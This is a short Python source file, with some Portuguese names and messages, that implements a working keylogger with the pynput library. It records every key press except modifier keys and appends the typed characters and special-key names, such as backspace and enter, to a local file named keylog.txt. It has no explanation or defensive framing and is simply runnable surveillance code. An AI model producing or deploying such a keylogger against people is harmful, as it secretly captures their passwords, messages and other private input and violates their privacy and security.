from pynput import keyboard

ignorate = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

def on_press(key):
    try:
        if key not in ignorate:
            with open("keylog.txt", "a", encoding="utf-8") as log_file:
                log_file.write(f"{key.char}")
    except AttributeError:
        if key not in ignorate:
            with open("keylog.txt", "a", encoding="utf-8") as log_file:
                if key == keyboard.Key.space:
                    log_file.write(" ")
                elif key == keyboard.Key.enter:
                    log_file.write("\n")
                elif key == keyboard.Key.backspace:
                    log_file.write("[BACKSPACE]")
                else:
                    log_file.write(f"[{key}]")
    except Exception as e:
        print(f"Erro ao registrar tecla: {e}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

